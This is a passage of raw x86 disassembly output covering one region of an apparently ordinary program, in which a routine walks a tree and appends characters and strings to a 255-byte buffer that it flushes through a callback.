  403c5b:	77 51                	ja     0x403cae
  403c5d:	8b 50 08             	mov    0x8(%eax),%edx
  403c60:	85 d2                	test   %edx,%edx
  403c62:	75 44                	jne    0x403ca8
  403c64:	83 fe 03             	cmp    $0x3,%esi
  403c67:	0f 87 e6 10 00 00    	ja     0x404d53
  403c6d:	8b 28                	mov    (%eax),%ebp
  403c6f:	89 f2                	mov    %esi,%edx
  403c71:	83 c6 01             	add    $0x1,%esi
  403c74:	c1 e2 04             	shl    $0x4,%edx
  403c77:	8d 4c 14 40          	lea    0x40(%esp,%edx,1),%ecx
  403c7b:	89 6c 14 40          	mov    %ebp,0x40(%esp,%edx,1)
  403c7f:	8b 68 04             	mov    0x4(%eax),%ebp
  403c82:	89 69 04             	mov    %ebp,0x4(%ecx)
  403c85:	8b 68 08             	mov    0x8(%eax),%ebp
  403c88:	89 69 08             	mov    %ebp,0x8(%ecx)
  403c8b:	8b 68 0c             	mov    0xc(%eax),%ebp
  403c8e:	89 69 0c             	mov    %ebp,0xc(%ecx)
  403c91:	89 7c 14 40          	mov    %edi,0x40(%esp,%edx,1)
  403c95:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  403c99:	01 d7                	add    %edx,%edi
  403c9b:	89 bb 14 01 00 00    	mov    %edi,0x114(%ebx)
  403ca1:	c7 40 08 01 00 00 00 	movl   $0x1,0x8(%eax)
  403ca8:	8b 00                	mov    (%eax),%eax
  403caa:	85 c0                	test   %eax,%eax
  403cac:	75 a2                	jne    0x403c50
  403cae:	8b 6c 24 28          	mov    0x28(%esp),%ebp
  403cb2:	8b 54 24 18          	mov    0x18(%esp),%edx
  403cb6:	89 d8                	mov    %ebx,%eax
  403cb8:	89 f7                	mov    %esi,%edi
  403cba:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403cbd:	e8 4e f2 ff ff       	call   0x402f10
  403cc2:	8b 44 24 24          	mov    0x24(%esp),%eax
  403cc6:	89 83 14 01 00 00    	mov    %eax,0x114(%ebx)
  403ccc:	8b 44 24 48          	mov    0x48(%esp),%eax
  403cd0:	85 c0                	test   %eax,%eax
  403cd2:	0f 85 28 f3 ff ff    	jne    0x403000
  403cd8:	83 fe 01             	cmp    $0x1,%esi
  403cdb:	0f 84 2c 15 00 00    	je     0x40520d
  403ce1:	8b 44 24 20          	mov    0x20(%esp),%eax
  403ce5:	c1 e6 04             	shl    $0x4,%esi
  403ce8:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  403cec:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  403cf0:	8d 74 30 f4          	lea    -0xc(%eax,%esi,1),%esi
  403cf4:	8b 0e                	mov    (%esi),%ecx
  403cf6:	83 ef 01             	sub    $0x1,%edi
  403cf9:	89 ea                	mov    %ebp,%edx
  403cfb:	89 d8                	mov    %ebx,%eax
  403cfd:	83 ee 10             	sub    $0x10,%esi
  403d00:	e8 5b 19 00 00       	call   0x405660
  403d05:	83 ff 01             	cmp    $0x1,%edi
  403d08:	75 ea                	jne    0x403cf4
  403d0a:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  403d0e:	8b 83 14 01 00 00    	mov    0x114(%ebx),%eax
  403d14:	8b 54 24 18          	mov    0x18(%esp),%edx
  403d18:	8d 4d 04             	lea    0x4(%ebp),%ecx
  403d1b:	89 04 24             	mov    %eax,(%esp)
  403d1e:	89 d8                	mov    %ebx,%eax
  403d20:	e8 fb 23 00 00       	call   0x406120
  403d25:	e9 d6 f2 ff ff       	jmp    0x403000
  403d2a:	f6 44 24 18 20       	testb  $0x20,0x18(%esp)
  403d2f:	0f 85 f4 0b 00 00    	jne    0x404929
  403d35:	8b 41 04             	mov    0x4(%ecx),%eax
  403d38:	85 c0                	test   %eax,%eax
  403d3a:	74 0b                	je     0x403d47
  403d3c:	f6 44 24 18 40       	testb  $0x40,0x18(%esp)
  403d41:	0f 84 cf 11 00 00    	je     0x404f16
  403d47:	8b 83 14 01 00 00    	mov    0x114(%ebx),%eax
  403d4d:	8b 54 24 18          	mov    0x18(%esp),%edx
  403d51:	8d 4d 08             	lea    0x8(%ebp),%ecx
  403d54:	89 04 24             	mov    %eax,(%esp)
  403d57:	83 e2 9f             	and    $0xffffff9f,%edx
  403d5a:	89 d8                	mov    %ebx,%eax
  403d5c:	e8 5f 26 00 00       	call   0x4063c0
  403d61:	e9 9a f2 ff ff       	jmp    0x403000
  403d66:	89 d8                	mov    %ebx,%eax
  403d68:	ba d0 7a 42 00       	mov    $0x427ad0,%edx
  403d6d:	e8 4e f0 ff ff       	call   0x402dc0
  403d72:	8b 4d 04             	mov    0x4(%ebp),%ecx
  403d75:	8b 54 24 18          	mov    0x18(%esp),%edx
  403d79:	89 d8                	mov    %ebx,%eax
  403d7b:	e8 90 f1 ff ff       	call   0x402f10
  403d80:	e9 7b f2 ff ff       	jmp    0x403000
  403d85:	89 d8                	mov    %ebx,%eax
  403d87:	ba ba 7a 42 00       	mov    $0x427aba,%edx
  403d8c:	e8 2f f0 ff ff       	call   0x402dc0
  403d91:	8b 4d 04             	mov    0x4(%ebp),%ecx
  403d94:	8b 54 24 18          	mov    0x18(%esp),%edx
  403d98:	89 d8                	mov    %ebx,%eax
  403d9a:	e8 71 f1 ff ff       	call   0x402f10
  403d9f:	e9 5c f2 ff ff       	jmp    0x403000
  403da4:	89 d8                	mov    %ebx,%eax
  403da6:	ba a9 7a 42 00       	mov    $0x427aa9,%edx
  403dab:	e8 10 f0 ff ff       	call   0x402dc0
  403db0:	8b 4d 04             	mov    0x4(%ebp),%ecx
  403db3:	8b 54 24 18          	mov    0x18(%esp),%edx
  403db7:	89 d8                	mov    %ebx,%eax
  403db9:	e8 52 f1 ff ff       	call   0x402f10
  403dbe:	e9 3d f2 ff ff       	jmp    0x403000
  403dc3:	89 d8                	mov    %ebx,%eax
  403dc5:	ba 96 7a 42 00       	mov    $0x427a96,%edx
  403dca:	e8 f1 ef ff ff       	call   0x402dc0
  403dcf:	8b 4d 04             	mov    0x4(%ebp),%ecx
  403dd2:	8b 54 24 18          	mov    0x18(%esp),%edx
  403dd6:	89 d8                	mov    %ebx,%eax
  403dd8:	e8 33 f1 ff ff       	call   0x402f10
  403ddd:	e9 1e f2 ff ff       	jmp    0x403000
  403de2:	89 d8                	mov    %ebx,%eax
  403de4:	ba 88 7a 42 00       	mov    $0x427a88,%edx
  403de9:	e8 d2 ef ff ff       	call   0x402dc0
  403dee:	8b 4d 04             	mov    0x4(%ebp),%ecx
  403df1:	8b 54 24 18          	mov    0x18(%esp),%edx
  403df5:	89 d8                	mov    %ebx,%eax
  403df7:	e8 14 f1 ff ff       	call   0x402f10
  403dfc:	e9 ff f1 ff ff       	jmp    0x403000
  403e01:	89 d8                	mov    %ebx,%eax
  403e03:	ba 6a 7a 42 00       	mov    $0x427a6a,%edx
  403e08:	e8 b3 ef ff ff       	call   0x402dc0
  403e0d:	8b 7c 24 18          	mov    0x18(%esp),%edi
  403e11:	8b 4d 04             	mov    0x4(%ebp),%ecx
  403e14:	89 d8                	mov    %ebx,%eax
  403e16:	89 fa                	mov    %edi,%edx
  403e18:	e8 f3 f0 ff ff       	call   0x402f10
  403e1d:	89 d8                	mov    %ebx,%eax
  403e1f:	ba 83 7a 42 00       	mov    $0x427a83,%edx
  403e24:	e8 97 ef ff ff       	call   0x402dc0
  403e29:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403e2c:	89 fa                	mov    %edi,%edx
  403e2e:	89 d8                	mov    %ebx,%eax
  403e30:	e8 db f0 ff ff       	call   0x402f10
  403e35:	e9 c6 f1 ff ff       	jmp    0x403000
  403e3a:	89 d8                	mov    %ebx,%eax
  403e3c:	ba 61 7a 42 00       	mov    $0x427a61,%edx
  403e41:	e8 7a ef ff ff       	call   0x402dc0
  403e46:	8b 4d 04             	mov    0x4(%ebp),%ecx
  403e49:	8b 54 24 18          	mov    0x18(%esp),%edx
  403e4d:	89 d8                	mov    %ebx,%eax
  403e4f:	e8 bc f0 ff ff       	call   0x402f10
  403e54:	e9 a7 f1 ff ff       	jmp    0x403000
  403e59:	89 d8                	mov    %ebx,%eax
  403e5b:	ba 55 7a 42 00       	mov    $0x427a55,%edx
  403e60:	e8 5b ef ff ff       	call   0x402dc0
  403e65:	8b 4d 04             	mov    0x4(%ebp),%ecx
  403e68:	8b 54 24 18          	mov    0x18(%esp),%edx
  403e6c:	89 d8                	mov    %ebx,%eax
  403e6e:	e8 9d f0 ff ff       	call   0x402f10
  403e73:	e9 88 f1 ff ff       	jmp    0x403000
  403e78:	89 d8                	mov    %ebx,%eax
  403e7a:	ba 7e 00 00 00       	mov    $0x7e,%edx
  403e7f:	e8 7c ea ff ff       	call   0x402900
  403e84:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403e87:	8b 54 24 18          	mov    0x18(%esp),%edx
  403e8b:	89 d8                	mov    %ebx,%eax
  403e8d:	e8 7e f0 ff ff       	call   0x402f10
  403e92:	e9 69 f1 ff ff       	jmp    0x403000
  403e97:	8b 49 08             	mov    0x8(%ecx),%ecx
  403e9a:	8b 54 24 18          	mov    0x18(%esp),%edx
  403e9e:	89 d8                	mov    %ebx,%eax
  403ea0:	e8 6b f0 ff ff       	call   0x402f10
  403ea5:	e9 56 f1 ff ff       	jmp    0x403000
  403eaa:	8b 79 04             	mov    0x4(%ecx),%edi
  403ead:	85 ff                	test   %edi,%edi
  403eaf:	0f 85 51 08 00 00    	jne    0x404706
  403eb5:	ba 2a 7c 42 00       	mov    $0x427c2a,%edx
  403eba:	89 d8                	mov    %ebx,%eax
  403ebc:	e8 ff ee ff ff       	call   0x402dc0
  403ec1:	e9 3a f1 ff ff       	jmp    0x403000
  403ec6:	8d 51 04             	lea    0x4(%ecx),%edx
  403ec9:	89 d8                	mov    %ebx,%eax
  403ecb:	e8 60 ed ff ff       	call   0x402c30
  403ed0:	85 c0                	test   %eax,%eax
  403ed2:	0f 84 a8 f1 ff ff    	je     0x403080
  403ed8:	83 38 2f             	cmpl   $0x2f,(%eax)
  403edb:	0f 84 66 0d 00 00    	je     0x404c47
  403ee1:	8b b3 10 01 00 00    	mov    0x110(%ebx),%esi
  403ee7:	89 c1                	mov    %eax,%ecx
  403ee9:	89 d8                	mov    %ebx,%eax
  403eeb:	8b 16                	mov    (%esi),%edx
  403eed:	89 93 10 01 00 00    	mov    %edx,0x110(%ebx)
  403ef3:	8b 54 24 18          	mov    0x18(%esp),%edx
  403ef7:	e8 14 f0 ff ff       	call   0x402f10
  403efc:	89 b3 10 01 00 00    	mov    %esi,0x110(%ebx)
  403f02:	e9 f9 f0 ff ff       	jmp    0x403000
  403f07:	8b 83 3c 01 00 00    	mov    0x13c(%ebx),%eax
  403f0d:	f6 44 24 18 04       	testb  $0x4,0x18(%esp)
  403f12:	89 8b 3c 01 00 00    	mov    %ecx,0x13c(%ebx)
  403f18:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403f1c:	8b 83 14 01 00 00    	mov    0x114(%ebx),%eax
  403f22:	c7 83 14 01 00 00 00 	movl   $0x0,0x114(%ebx)
  403f29:	00 00 00 
  403f2c:	89 44 24 20          	mov    %eax,0x20(%esp)
  403f30:	8b 41 04             	mov    0x4(%ecx),%eax
  403f33:	74 10                	je     0x403f45
  403f35:	8b 30                	mov    (%eax),%esi
  403f37:	85 f6                	test   %esi,%esi
  403f39:	75 0a                	jne    0x403f45
  403f3b:	83 78 08 06          	cmpl   $0x6,0x8(%eax)
  403f3f:	0f 84 94 12 00 00    	je     0x4051d9
  403f45:	8b 54 24 18          	mov    0x18(%esp),%edx
  403f49:	89 c1                	mov    %eax,%ecx
  403f4b:	89 d8                	mov    %ebx,%eax
  403f4d:	e8 be ef ff ff       	call   0x402f10
  403f52:	80 bb 04 01 00 00 3c 	cmpb   $0x3c,0x104(%ebx)
  403f59:	0f 84 41 11 00 00    	je     0x4050a0
  403f5f:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  403f65:	3d ff 00 00 00       	cmp    $0xff,%eax
  403f6a:	0f 84 f2 0d 00 00    	je     0x404d62
  403f70:	8d 50 01             	lea    0x1(%eax),%edx
  403f73:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  403f79:	c6 04 03 3c          	movb   $0x3c,(%ebx,%eax,1)
  403f7d:	89 d8                	mov    %ebx,%eax
  403f7f:	c6 83 04 01 00 00 3c 	movb   $0x3c,0x104(%ebx)
  403f86:	8b 54 24 18          	mov    0x18(%esp),%edx
  403f8a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403f8d:	e8 7e ef ff ff       	call   0x402f10
  403f92:	80 bb 04 01 00 00 3e 	cmpb   $0x3e,0x104(%ebx)
  403f99:	0f 84 12 11 00 00    	je     0x4050b1
  403f9f:	ba 3e 00 00 00       	mov    $0x3e,%edx
  403fa4:	89 d8                	mov    %ebx,%eax
  403fa6:	e8 55 e9 ff ff       	call   0x402900
  403fab:	8b 44 24 20          	mov    0x20(%esp),%eax
  403faf:	89 83 14 01 00 00    	mov    %eax,0x114(%ebx)
  403fb5:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403fb9:	89 83 3c 01 00 00    	mov    %eax,0x13c(%ebx)
  403fbf:	e9 3c f0 ff ff       	jmp    0x403000
  403fc4:	8b 7c 24 18          	mov    0x18(%esp),%edi
  403fc8:	8b 49 04             	mov    0x4(%ecx),%ecx
  403fcb:	89 d8                	mov    %ebx,%eax
  403fcd:	89 fa                	mov    %edi,%edx
  403fcf:	e8 3c ef ff ff       	call   0x402f10
  403fd4:	89 f8                	mov    %edi,%eax
  403fd6:	a8 04                	test   $0x4,%al
  403fd8:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  403fde:	0f 85 be 04 00 00    	jne    0x4044a2
  403fe4:	be 36 7a 42 00       	mov    $0x427a36,%esi
  403fe9:	eb 28                	jmp    0x404013
  403feb:	90                   	nop
  403fec:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403ff0:	89 c1                	mov    %eax,%ecx
  403ff2:	83 c0 01             	add    $0x1,%eax
  403ff5:	83 c6 01             	add    $0x1,%esi
  403ff8:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  403ffe:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  404001:	81 fe 38 7a 42 00    	cmp    $0x427a38,%esi
  404007:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  40400d:	0f 84 ae 04 00 00    	je     0x4044c1
  404013:	3d ff 00 00 00       	cmp    $0xff,%eax
  404018:	0f b6 16             	movzbl (%esi),%edx
  40401b:	75 d3                	jne    0x403ff0
  40401d:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  404023:	88 54 24 1c          	mov    %dl,0x1c(%esp)
  404027:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40402e:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  404035:	00 
  404036:	89 1c 24             	mov    %ebx,(%esp)
  404039:	89 44 24 08          	mov    %eax,0x8(%esp)
  40403d:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  404043:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  40404a:	b8 01 00 00 00       	mov    $0x1,%eax
  40404f:	31 c9                	xor    %ecx,%ecx
  404051:	0f b6 54 24 1c       	movzbl 0x1c(%esp),%edx
  404056:	eb 9d                	jmp    0x403ff5
  404058:	8b 83 14 01 00 00    	mov    0x114(%ebx),%eax
  40405e:	c7 83 14 01 00 00 00 	movl   $0x0,0x114(%ebx)
  404065:	00 00 00 
  404068:	8b 79 04             	mov    0x4(%ecx),%edi
  40406b:	89 44 24 24          	mov    %eax,0x24(%esp)
  40406f:	85 ff                	test   %edi,%edi
  404071:	74 57                	je     0x4040ca
  404073:	8b 83 10 01 00 00    	mov    0x110(%ebx),%eax
  404079:	31 d2                	xor    %edx,%edx
  40407b:	31 f6                	xor    %esi,%esi
  40407d:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  404081:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  404085:	8d 44 24 40          	lea    0x40(%esp),%eax
  404089:	89 44 24 20          	mov    %eax,0x20(%esp)
  40408d:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  404091:	89 10                	mov    %edx,(%eax)
  404093:	83 c6 01             	add    $0x1,%esi
  404096:	8b 17                	mov    (%edi),%edx
  404098:	89 c5                	mov    %eax,%ebp
  40409a:	89 83 14 01 00 00    	mov    %eax,0x114(%ebx)
  4040a0:	89 78 04             	mov    %edi,0x4(%eax)
  4040a3:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  4040aa:	89 48 0c             	mov    %ecx,0xc(%eax)
  4040ad:	8d 4a e4             	lea    -0x1c(%edx),%ecx
  4040b0:	83 f9 04             	cmp    $0x4,%ecx
  4040b3:	0f 87 5d 11 00 00    	ja     0x405216
  4040b9:	8b 7f 04             	mov    0x4(%edi),%edi
  4040bc:	85 ff                	test   %edi,%edi
  4040be:	74 0a                	je     0x4040ca
  4040c0:	83 c0 10             	add    $0x10,%eax
  4040c3:	83 fe 04             	cmp    $0x4,%esi
  4040c6:	89 ea                	mov    %ebp,%edx
  4040c8:	75 c3                	jne    0x40408d
  4040ca:	c7 83 18 01 00 00 01 	movl   $0x1,0x118(%ebx)
  4040d1:	00 00 00 
  4040d4:	e9 27 ef ff ff       	jmp    0x403000
  4040d9:	f6 44 24 18 04       	testb  $0x4,0x18(%esp)
  4040de:	0f 85 9e 0b 00 00    	jne    0x404c82
  4040e4:	8b 79 08             	mov    0x8(%ecx),%edi
  4040e7:	8b 71 04             	mov    0x4(%ecx),%esi
  4040ea:	85 ff                	test   %edi,%edi
  4040ec:	0f 84 0e ef ff ff    	je     0x403000
  4040f2:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  4040f8:	01 f7                	add    %esi,%edi
  4040fa:	eb 23                	jmp    0x40411f
  4040fc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404100:	89 c1                	mov    %eax,%ecx
  404102:	83 c0 01             	add    $0x1,%eax
  404105:	83 c6 01             	add    $0x1,%esi
  404108:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  40410e:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  404111:	39 fe                	cmp    %edi,%esi
  404113:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  404119:	0f 84 e1 ee ff ff    	je     0x403000
  40411f:	3d ff 00 00 00       	cmp    $0xff,%eax
  404124:	0f b6 16             	movzbl (%esi),%edx
  404127:	75 d7                	jne    0x404100
  404129:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  40412f:	88 54 24 18          	mov    %dl,0x18(%esp)
  404133:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40413a:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  404141:	00 
  404142:	89 1c 24             	mov    %ebx,(%esp)
  404145:	89 44 24 08          	mov    %eax,0x8(%esp)
  404149:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  40414f:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  404156:	b8 01 00 00 00       	mov    $0x1,%eax
  40415b:	31 c9                	xor    %ecx,%ecx
  40415d:	0f b6 54 24 18       	movzbl 0x18(%esp),%edx
  404162:	eb a1                	jmp    0x404105
  404164:	8b 79 08             	mov    0x8(%ecx),%edi
  404167:	8b 71 04             	mov    0x4(%ecx),%esi
  40416a:	85 ff                	test   %edi,%edi
  40416c:	0f 84 8e ee ff ff    	je     0x403000
  404172:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  404178:	01 f7                	add    %esi,%edi
  40417a:	eb 23                	jmp    0x40419f
  40417c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404180:	89 c1                	mov    %eax,%ecx
  404182:	83 c0 01             	add    $0x1,%eax
  404185:	83 c6 01             	add    $0x1,%esi
  404188:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  40418e:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  404191:	39 fe                	cmp    %edi,%esi
  404193:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  404199:	0f 84 61 ee ff ff    	je     0x403000
  40419f:	3d ff 00 00 00       	cmp    $0xff,%eax
  4041a4:	0f b6 16             	movzbl (%esi),%edx
  4041a7:	75 d7                	jne    0x404180
  4041a9:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  4041af:	88 54 24 18          	mov    %dl,0x18(%esp)
  4041b3:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  4041ba:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  4041c1:	00 
  4041c2:	89 1c 24             	mov    %ebx,(%esp)
  4041c5:	89 44 24 08          	mov    %eax,0x8(%esp)
  4041c9:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  4041cf:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  4041d6:	b8 01 00 00 00       	mov    $0x1,%eax
  4041db:	31 c9                	xor    %ecx,%ecx
  4041dd:	0f b6 54 24 18       	movzbl 0x18(%esp),%edx
  4041e2:	eb a1                	jmp    0x404185
  4041e4:	89 d8                	mov    %ebx,%eax
  4041e6:	ba 6e 7b 42 00       	mov    $0x427b6e,%edx
  4041eb:	e8 d0 eb ff ff       	call   0x402dc0
  4041f0:	8b 4d 04             	mov    0x4(%ebp),%ecx
  4041f3:	8b 54 24 18          	mov    0x18(%esp),%edx
  4041f7:	89 d8                	mov    %ebx,%eax
  4041f9:	e8 12 ed ff ff       	call   0x402f10
  4041fe:	e9 fd ed ff ff       	jmp    0x403000
  404203:	89 d8                	mov    %ebx,%eax
  404205:	ba 52 7b 42 00       	mov    $0x427b52,%edx
  40420a:	e8 b1 eb ff ff       	call   0x402dc0
  40420f:	8b 7c 24 18          	mov    0x18(%esp),%edi
  404213:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404216:	89 d8                	mov    %ebx,%eax
  404218:	89 fa                	mov    %edi,%edx
  40421a:	e8 f1 ec ff ff       	call   0x402f10
  40421f:	89 d8                	mov    %ebx,%eax
  404221:	ba 68 7b 42 00       	mov    $0x427b68,%edx
  404226:	e8 95 eb ff ff       	call   0x402dc0
  40422b:	8b 4d 04             	mov    0x4(%ebp),%ecx
  40422e:	89 fa                	mov    %edi,%edx
  404230:	89 d8                	mov    %ebx,%eax
  404232:	e8 d9 ec ff ff       	call   0x402f10
  404237:	e9 c4 ed ff ff       	jmp    0x403000
  40423c:	89 d8                	mov    %ebx,%eax
  40423e:	ba 38 7b 42 00       	mov    $0x427b38,%edx
  404243:	e8 78 eb ff ff       	call   0x402dc0
  404248:	8b 4d 04             	mov    0x4(%ebp),%ecx
  40424b:	8b 54 24 18          	mov    0x18(%esp),%edx
  40424f:	89 d8                	mov    %ebx,%eax
  404251:	e8 ba ec ff ff       	call   0x402f10
  404256:	e9 a5 ed ff ff       	jmp    0x403000
  40425b:	89 d8                	mov    %ebx,%eax
  40425d:	ba 21 7b 42 00       	mov    $0x427b21,%edx
  404262:	e8 59 eb ff ff       	call   0x402dc0
  404267:	8b 4d 04             	mov    0x4(%ebp),%ecx
  40426a:	8b 54 24 18          	mov    0x18(%esp),%edx
  40426e:	89 d8                	mov    %ebx,%eax
  404270:	e8 9b ec ff ff       	call   0x402f10
  404275:	e9 86 ed ff ff       	jmp    0x403000
  40427a:	89 d8                	mov    %ebx,%eax
  40427c:	ba 0d 7b 42 00       	mov    $0x427b0d,%edx
  404281:	e8 3a eb ff ff       	call   0x402dc0
  404286:	8b 4d 04             	mov    0x4(%ebp),%ecx
  404289:	8b 54 24 18          	mov    0x18(%esp),%edx
  40428d:	89 d8                	mov    %ebx,%eax
  40428f:	e8 7c ec ff ff       	call   0x402f10
  404294:	e9 67 ed ff ff       	jmp    0x403000
  404299:	89 d8                	mov    %ebx,%eax
  40429b:	ba fd 7a 42 00       	mov    $0x427afd,%edx
  4042a0:	e8 1b eb ff ff       	call   0x402dc0
  4042a5:	8b 4d 04             	mov    0x4(%ebp),%ecx
  4042a8:	8b 54 24 18          	mov    0x18(%esp),%edx
  4042ac:	89 d8                	mov    %ebx,%eax
  4042ae:	e8 5d ec ff ff       	call   0x402f10
  4042b3:	e9 48 ed ff ff       	jmp    0x403000
  4042b8:	89 d8                	mov    %ebx,%eax
  4042ba:	ba e2 7a 42 00       	mov    $0x427ae2,%edx
  4042bf:	e8 fc ea ff ff       	call   0x402dc0
  4042c4:	8b 4d 04             	mov    0x4(%ebp),%ecx
  4042c7:	8b 54 24 18          	mov    0x18(%esp),%edx
  4042cb:	89 d8                	mov    %ebx,%eax
  4042cd:	e8 3e ec ff ff       	call   0x402f10
  4042d2:	e9 29 ed ff ff       	jmp    0x403000
  4042d7:	f6 44 24 18 04       	testb  $0x4,0x18(%esp)
  4042dc:	8b 41 04             	mov    0x4(%ecx),%eax
  4042df:	0f 85 81 05 00 00    	jne    0x404866
  4042e5:	8b 78 04             	mov    0x4(%eax),%edi
  4042e8:	8b 30                	mov    (%eax),%esi
  4042ea:	85 ff                	test   %edi,%edi
  4042ec:	0f 84 0e ed ff ff    	je     0x403000
  4042f2:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  4042f8:	01 f7                	add    %esi,%edi
  4042fa:	eb 23                	jmp    0x40431f
  4042fc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404300:	89 c1                	mov    %eax,%ecx
  404302:	83 c0 01             	add    $0x1,%eax
  404305:	83 c6 01             	add    $0x1,%esi
  404308:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  40430e:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  404311:	39 fe                	cmp    %edi,%esi
  404313:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  404319:	0f 84 e1 ec ff ff    	je     0x403000
  40431f:	3d ff 00 00 00       	cmp    $0xff,%eax
  404324:	0f b6 16             	movzbl (%esi),%edx
  404327:	75 d7                	jne    0x404300
  404329:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  40432f:	88 54 24 18          	mov    %dl,0x18(%esp)
  404333:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40433a:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  404341:	00 
  404342:	89 1c 24             	mov    %ebx,(%esp)
  404345:	89 44 24 08          	mov    %eax,0x8(%esp)
  404349:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  40434f:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  404356:	b8 01 00 00 00       	mov    $0x1,%eax
  40435b:	31 c9                	xor    %ecx,%ecx
  40435d:	0f b6 54 24 18       	movzbl 0x18(%esp),%edx
  404362:	eb a1                	jmp    0x404305
  404364:	8b 41 04             	mov    0x4(%ecx),%eax
  404367:	31 f6                	xor    %esi,%esi
  404369:	83 38 05             	cmpl   $0x5,(%eax)
  40436c:	0f 84 2d 07 00 00    	je     0x404a9f
  404372:	8b 10                	mov    (%eax),%edx
  404374:	83 fa 23             	cmp    $0x23,%edx
  404377:	0f 84 78 05 00 00    	je     0x4048f5
  40437d:	3b 55 00             	cmp    0x0(%ebp),%edx
  404380:	0f 84 6f 05 00 00    	je     0x4048f5
  404386:	83 fa 24             	cmp    $0x24,%edx
  404389:	0f 84 cd 0c 00 00    	je     0x40505c
  40438f:	8b bb 14 01 00 00    	mov    0x114(%ebx),%edi
  404395:	8d 44 24 40          	lea    0x40(%esp),%eax
  404399:	89 7c 24 40          	mov    %edi,0x40(%esp)
  40439d:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  4043a1:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%esp)
  4043a8:	00 
  4043a9:	89 83 14 01 00 00    	mov    %eax,0x114(%ebx)
  4043af:	8b 83 10 01 00 00    	mov    0x110(%ebx),%eax
  4043b5:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  4043b9:	8b 4d 04             	mov    0x4(%ebp),%ecx
  4043bc:	8b 54 24 18          	mov    0x18(%esp),%edx
  4043c0:	89 d8                	mov    %ebx,%eax
  4043c2:	e8 49 eb ff ff       	call   0x402f10
  4043c7:	8b 7c 24 48          	mov    0x48(%esp),%edi
  4043cb:	85 ff                	test   %edi,%edi
  4043cd:	0f 84 09 03 00 00    	je     0x4046dc
  4043d3:	8b 44 24 40          	mov    0x40(%esp),%eax
  4043d7:	85 f6                	test   %esi,%esi
  4043d9:	89 83 14 01 00 00    	mov    %eax,0x114(%ebx)
  4043df:	0f 84 1b ec ff ff    	je     0x403000
  4043e5:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4043e9:	89 83 10 01 00 00    	mov    %eax,0x110(%ebx)
  4043ef:	e9 0c ec ff ff       	jmp    0x403000
  4043f4:	8b bb 14 01 00 00    	mov    0x114(%ebx),%edi
  4043fa:	31 f6                	xor    %esi,%esi
  4043fc:	eb 97                	jmp    0x404395
  4043fe:	8b bb 14 01 00 00    	mov    0x114(%ebx),%edi
  404404:	85 ff                	test   %edi,%edi
  404406:	0f 84 40 11 00 00    	je     0x40554c
  40440c:	89 fa                	mov    %edi,%edx
  40440e:	66 90                	xchg   %ax,%ax
  404410:	8b 4a 08             	mov    0x8(%edx),%ecx
  404413:	85 c9                	test   %ecx,%ecx
  404415:	75 15                	jne    0x40442c
  404417:	8b 4a 04             	mov    0x4(%edx),%ecx
  40441a:	8b 09                	mov    (%ecx),%ecx
  40441c:	8d 71 e7             	lea    -0x19(%ecx),%esi
  40441f:	83 fe 02             	cmp    $0x2,%esi
  404422:	77 0e                	ja     0x404432
